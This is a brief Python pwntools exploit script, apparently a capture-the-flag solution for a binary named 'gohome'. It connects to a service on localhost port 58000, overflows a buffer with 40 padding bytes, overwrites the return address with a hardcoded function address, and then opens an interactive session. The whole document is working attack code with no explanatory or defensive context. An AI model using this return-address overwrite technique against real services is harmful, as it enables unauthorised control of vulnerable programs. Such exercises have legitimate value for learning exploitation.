from pwn import *

# r = process('./gohome')
r = remote('localhost', 58000)

payload = 'A'*40
Billyshouse = 0x4006c6

r.recvuntil('?')
r.sendline(payload + p64(Billyshouse))

r.interactive()
